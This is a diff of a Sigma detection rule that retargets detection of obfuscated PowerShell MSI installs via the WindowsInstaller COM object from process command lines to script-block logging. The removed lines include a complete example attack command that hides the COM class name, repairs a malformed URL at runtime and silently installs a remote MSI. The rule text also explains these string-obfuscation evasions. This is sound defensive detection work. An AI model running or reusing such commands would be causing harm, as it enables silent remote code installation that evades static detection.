@@ -1,8 +1,11 @@
-title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
-id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
+title: Obfuscated MSI Install via WindowsInstaller COM Object - PowerShell
+id: 02a2c4ba-f0fc-40b5-aece-b968bfdae379
+related:
+    - id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
+      type: similar
 status: experimental
 description: |
-    Detects the execution of obfuscated PowerShell commands that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+    Detects obfuscated PowerShell command or script execution that attempt to install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
     The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., 'indowsInstaller.Installer'.Insert(0,'W')) and correcting
     malformed URLs (e.g., converting 'htps://' to 'https://') at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
     by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
@@ -11,8 +14,8 @@ references:
     - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
     - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
     - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
-author: Meroujan Antonyan (vx3r)
-date: 2025-05-27
+author: Meroujan Antonyan (vx3r), Swachchhanda Shrawan Poudel (Nextron Systems)
+date: 2025-07-28
 tags:
     - attack.defense-evasion
     - attack.t1027.010
@@ -20,26 +23,16 @@ tags:
     - attack.execution
     - attack.t1059.001
 logsource:
-    category: process_creation
+    category: ps_script
     product: windows
 detection:
-    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
-    selection_img:
-        - Image|endswith:
-              - '\powershell_ise.exe'
-              - '\powershell.exe'
-              - '\pwsh.exe'
-        - OriginalFileName:
-              - 'PowerShell_ISE.EXE'
-              - 'PowerShell.EXE'
-              - 'pwsh.dll'
-    selection_cli:
-        CommandLine|contains|all:
+    selection:
+        ScriptBlockText|contains|all:
             - '-ComObject'
-            - 'InstallProduct('
             - '.Insert('
+            - 'InstallProduct('
             - 'UILevel'
-    condition: all of selection_*
+    condition: selection
 falsepositives:
     - Unknown
 level: high
